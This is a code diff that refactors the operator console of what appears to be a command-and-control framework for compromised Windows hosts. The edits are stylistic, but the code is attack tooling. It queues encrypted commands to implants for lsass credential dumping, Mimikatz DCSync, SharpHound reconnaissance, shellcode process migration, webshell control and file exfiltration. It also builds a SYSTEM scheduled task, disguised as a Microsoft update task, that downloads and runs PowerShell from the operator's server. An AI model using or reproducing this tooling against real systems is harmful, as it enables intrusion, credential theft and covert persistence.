@@ -21,10 +21,7 @@ import pickle
 
 def Command_Completer(text, state):
     options = [i for i in cmd.COMMANDS if i.startswith(text)]
-    if state < len(options):
-        return options[state]
-    else:
-        return None
+    return options[state] if state < len(options) else None
 
 
 class cmd:
@@ -116,7 +113,13 @@ class cmd:
      ['lsass_memory_dump', 'dump lsass memory without touching the disk then parse it and provide credentials )']]
 
     def help(self, args = None):
-        table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
+        table = prettytable.PrettyTable(
+            [
+                f'{bcolors.BOLD}Command{bcolors.ENDC}',
+                f'{bcolors.BOLD}Description{bcolors.ENDC}',
+            ]
+        )
+
         table.border = False
         table.align = 'l'
         table.add_row(['-------', '-----------'])
@@ -135,7 +138,11 @@ class cmd:
                 pickle.dump(config.WEBSHELLS, f)
         else:
             #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"exit"))
-            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"kill "+config.AGENTS[config.get_pointer()][8]))
+            config.COMMAND[config.get_pointer()].append(
+                encrypt(
+                    config.AESKey, f"kill {config.AGENTS[config.get_pointer()][8]}"
+                )
+            )
 
     def list(self, args = None):
         if config.Implant_Type=='webshell':
@@ -145,15 +152,20 @@ class cmd:
 
 
     def list_agents(self, args=None):
-        table = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC,
-         bcolors.BOLD + 'Status' + bcolors.ENDC,
-         bcolors.BOLD + 'ExternalIP' + bcolors.ENDC,
-         bcolors.BOLD + 'InternalIP' + bcolors.ENDC,
-         bcolors.BOLD + 'OS' + bcolors.ENDC,
-         bcolors.BOLD + 'Arch' + bcolors.ENDC,
-         bcolors.BOLD + 'ComputerName' + bcolors.ENDC,
-         bcolors.BOLD + 'Username' + bcolors.ENDC,
-         bcolors.BOLD + 'PID' + bcolors.ENDC])
+        table = prettytable.PrettyTable(
+            [
+                f'{bcolors.BOLD}ID{bcolors.ENDC}',
+                f'{bcolors.BOLD}Status{bcolors.ENDC}',
+                f'{bcolors.BOLD}ExternalIP{bcolors.ENDC}',
+                f'{bcolors.BOLD}InternalIP{bcolors.ENDC}',
+                f'{bcolors.BOLD}OS{bcolors.ENDC}',
+                f'{bcolors.BOLD}Arch{bcolors.ENDC}',
+                f'{bcolors.BOLD}ComputerName{bcolors.ENDC}',
+                f'{bcolors.BOLD}Username{bcolors.ENDC}',
+                f'{bcolors.BOLD}PID{bcolors.ENDC}',
+            ]
+        )
+
         table.border = False
         table.align = 'l'
         table.add_row(['--',
@@ -211,7 +223,7 @@ class cmd:
         if config.get_pointer()!='main':
             config.set_pointer('main')
         for i in config.AGENTS:
-            config.COMMAND[i].append(encrypt(config.AESKey,"kill "+config.AGENTS[i][8]))
+            config.COMMAND[i].append(encrypt(config.AESKey, f"kill {config.AGENTS[i][8]}"))
 
     def delete_all(self, args = None):
         if config.get_pointer()!='main':
@@ -223,11 +235,11 @@ class cmd:
         if config.get_pointer()=='webshell' or config.Implant_Type=='webshell':
             config.set_pointer('webshell')
             id = args[1]
-            webshell=''
-            for i in config.WEBSHELLS:
-                if id == str(config.WEBSHELLS[i][0]):
-                    webshell=i
-                    break
+            webshell = next(
+                (i for i in config.WEBSHELLS if id == str(config.WEBSHELLS[i][0])),
+                '',
+            )
+
             if webshell!='':
                 del config.WEBSHELLS[webshell]
             return
@@ -237,11 +249,7 @@ class cmd:
             print ("delete <id>")
             return
         id = args[1]
-        agent=''
-        for i in config.AGENTS:
-            if id == str(config.AGENTS[i][0]):
-                agent=i
-                break
+        agent = next((i for i in config.AGENTS if id == str(config.AGENTS[i][0])), '')
         if agent!='':
             del config.AGENTS[agent]
 
@@ -264,10 +272,9 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
-        fpm = open('Modules/' + args[1], 'r')
-        module = fpm.read()
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,module))
-        fpm.close()
+        with open(f'Modules/{args[1]}', 'r') as fpm:
+            module = fpm.read()
+            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,module))
 
     def downloads(self, args=None):
         if config.get_pointer()=='main':
@@ -362,7 +369,7 @@ class cmd:
             print("This command can only be used in agent mode")
             return
         user=[]
-        try :
+        try:
             if len(args) < 2:
                 print ("Usage dcsunc_list <full file path>")
                 return
@@ -370,9 +377,8 @@ class cmd:
             if len(' '.join(args[1:]).split(","))>1:
                 users=' '.join(args[1:]).replace(", ",",").replace(" ,",",")
             else:
-                list = open(args[1], 'r')
-                users = list.read()
-                list.close()
+                with open(args[1], 'r') as list:
+                    users = list.read()
                 users=users.replace("\n",",")
                 users="".join(users)
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
@@ -424,7 +430,15 @@ class cmd:
             print("This command can only be used in agent mode")
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SharpHound.ps1"))
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName "+"".join([random.choice(string.ascii_uppercase) for i in range(5)])))
+        config.COMMAND[config.get_pointer()].append(
+            encrypt(
+                config.AESKey,
+                "Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName "
+                + "".join(
+                    [random.choice(string.ascii_uppercase) for _ in range(5)]
+                ),
+            )
+        )
 
     def drm(self, args=None):
         if config.get_pointer()=='main':
@@ -462,7 +476,7 @@ class cmd:
             print("This command can only be used in agent mode")
             return
         CC=''
-        while len(CC) == 0:
+        while not CC:
             CC = input('please enter schedule type ( hourly , daily , weekly , onstart) or type exit to exit the persistence module')
             if len(CC)>1:
                 try:
@@ -487,10 +501,7 @@ class cmd:
             else:
                 CC=''
                 continue
-        if SSL==True:
-            http="https"
-        else:
-            http="http"
+        http = "https" if SSL==True else "http"
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""schtasks /F /create /SC {freq} /RU "NT Authority\SYSTEM" /TN "\\Microsoft\\Windows\\UpdateOrchestrators\\AC Power install" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''{HTTP}://{ip}:{port}{payload}''')'\"""".replace('{ip}', HOST).replace('{port}', PORT).replace('{payload}', raw_payload).replace('{HTTP}', http).replace('{freq}', freq)))
 
 
@@ -501,16 +512,14 @@ class cmd:
         if config.Implant_Type!='agent':
             print("This command can only be used in agent mode")
             return
-        f=open("agents/screenshot.ninja","r")
-        payload=f.read()
-        f.close()
+        with open("agents/screenshot.ninja","r") as f:
+            payload=f.read()
         if SSL==True:
             payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{image}', image_url).replace('{cmd}', command_url).replace('{HTTP}', "https")
         else:
             payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{image}', image_url).replace('{cmd}', command_url).replace('{HTTP}', "http")
-        f=open("Modules/screenshot.ps1","w")
-        f.write(payload)
-        f.close()
+        with open("Modules/screenshot.ps1","w") as f:
+            f.write(payload)
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load screenshot.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"scr  -test 0 "))
 
@@ -523,16 +532,14 @@ class cmd:
         if config.Implant_Type=='webshell':
             _thread.start_new_thread( webshell.upload_file, (config.WEBSHELLS[config.POINTER],args, ) )
         else:
-            f=open("agents/upload.ninja","r")
-            payload=f.read()
-            f.close()
+            with open("agents/upload.ninja","r") as f:
+                payload=f.read()
             if SSL==True:
                 payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "https")
             else:
                 payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "http")
-            f=open("Modules/upload.ps1","w")
-            f.write(payload)
-            f.close()
+            with open("Modules/upload.ps1","w") as f:
+                f.write(payload)
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load upload.ps1"))
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"up -filename \""+args[1]+"\""))
 
@@ -545,16 +552,14 @@ class cmd:
             _thread.start_new_thread( webshell.download_file, (config.WEBSHELLS[config.POINTER],args, ) )
         else:
             global loaded
-            f=open("agents/download.ninja","r")
-            payload=f.read()
-            f.close()
+            with open("agents/download.ninja","r") as f:
+                payload=f.read()
             if SSL==True:
                 payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "https")
             else:
                 payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "http")
-            f=open("Modules/download.ps1","w")
-            f.write(payload)
-            f.close()
+            with open("Modules/download.ps1","w") as f:
+                f.write(payload)
             #if loaded["download"]==False:
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load download.ps1"))
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"dn -filename \""+args[1]+"\""))
@@ -568,7 +573,9 @@ class cmd:
             print("This command can only be used in agent mode")
             return
         global loaded
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"$exchange="+args[1]))
+        config.COMMAND[config.get_pointer()].append(
+            encrypt(config.AESKey, f"$exchange={args[1]}")
+        )
 
     def unamanged_powershell(self, args=None):
         if config.get_pointer()=='main':
@@ -595,10 +602,15 @@ class cmd:
         shellcode=donut.create(file="payloads/dropper_cs.exe")
         fp = open('agents/Migrator.ninja', 'r')
         temp = fp.read()
-        temp=temp.replace('{shellcode}',base64.b64encode(shellcode).decode("utf-8")).replace('{class}',"".join([random.choice(string.ascii_uppercase) for i in range(5)]))
-        output=open('Modules/Migrator.ps1', 'w')
-        output.write(temp)
-        output.close()
+        temp = temp.replace(
+            '{shellcode}', base64.b64encode(shellcode).decode("utf-8")
+        ).replace(
+            '{class}',
+            "".join([random.choice(string.ascii_uppercase) for _ in range(5)]),
+        )
+
+        with open('Modules/Migrator.ps1', 'w') as output:
+            output.write(temp)
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Migrator.ps1"))
 
     def processlist(self, args=None):
@@ -623,7 +635,7 @@ class cmd:
             print ("Usage split <full file path>")
             return
         path=' '.join(args[1:])
-        while len(MB) == 0:
+        while not MB:
             MB = input('please enter the split size in MB ')
             if len(MB)>0:
                 try:
@@ -636,7 +648,9 @@ class cmd:
                 MB=''
                 continue
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load split.ps1"))
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"split -path "+path+" -chunksize "+str(Bytes)))
+        config.COMMAND[config.get_pointer()].append(
+            encrypt(config.AESKey, f"split -path {path} -chunksize {str(Bytes)}")
+        )
 
     def join(self, args=None):
         if config.Implant_Type!='agent':
@@ -646,7 +660,7 @@ class cmd:
             print ("Usage join <full Dir path with original file name at the end of path>")
             return
         path=' '.join(args[1:])
-        filenames = glob.glob(path+".*.part")
+        filenames = glob.glob(f"{path}.*.part")
         list.sort(filenames)
 
         if len(filenames)==0:
@@ -672,7 +686,7 @@ class cmd:
         URL=args[1]
         KEY=args[2]
         config.WEBSHELL_COUNT=0
-        for i in config.WEBSHELLS:
+        for _ in config.WEBSHELLS:
             config.WEBSHELL_COUNT=config.WEBSHELL_COUNT+1
         config.WEBSHELLS.update({config.WEBSHELL_COUNT:[str(config.WEBSHELL_COUNT+1),URL,KEY]})
         config.WEBSHELL_COUNT=config.WEBSHELL_COUNT+1
@@ -723,10 +737,13 @@ class cmd:
         try:
             fp = open('Modules/safetydump.ninja', 'r')
             temp = fp.read()
-            temp=temp.replace('{CLASS}',"".join([random.choice(string.ascii_uppercase) for i in range(5)]))
-            output=open('Modules/SafetyDump.ps1', 'w')
-            output.write(temp)
-            output.close()
+            temp = temp.replace(
+                '{CLASS}',
+                "".join([random.choice(string.ascii_uppercase) for _ in range(5)]),
+            )
+
+            with open('Modules/SafetyDump.ps1', 'w') as output:
+                output.write(temp)
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SafetyDump.ps1"))
         except:
             print("Error in lsass_memory_dump")
